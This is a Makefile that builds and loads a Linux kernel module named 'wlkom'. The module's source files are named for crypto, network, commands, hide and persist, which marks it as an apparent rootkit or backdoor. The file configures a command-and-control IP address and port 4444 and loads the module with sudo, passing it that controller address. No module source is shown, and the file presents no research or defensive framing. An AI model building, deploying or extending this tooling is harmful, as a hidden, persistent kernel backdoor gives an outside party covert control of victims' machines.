obj-m += wlkom.o
wlkom-objs := src/main.o src/crypto.o src/protocol.o src/network.o src/commands.o src/hide.o src/persist.o

ccflags-y += -Wno-declaration-after-statement -I$(src)/include

ccflags-y += -DCONFIG_X86_64

KDIR := /lib/modules/$(shell uname -r)/build

CONTROL_IP   ?= 192.168.100.10
CONTROL_PORT ?= 4444

.PHONY: all clean load unload

all:
	@if [ ! -d "$(KDIR)" ]; then \
		echo "ERROR: Kernel headers not found at $(KDIR)"; \
		echo "Arch:   sudo pacman -S linux-headers"; \
		echo "Debian: sudo apt install linux-headers-$$(uname -r)"; \
		exit 1; \
	fi
	make -C $(KDIR) M=$(CURDIR) modules

clean:
	make -C $(KDIR) M=$(CURDIR) clean

load:
	sudo insmod wlkom.ko control_ip="$(CONTROL_IP)" control_port=$(CONTROL_PORT)

unload:
	sudo rmmod wlkom

test-load: load
	sleep 2
	sudo dmesg | tail -20 | grep WLKOM
	sudo make unload

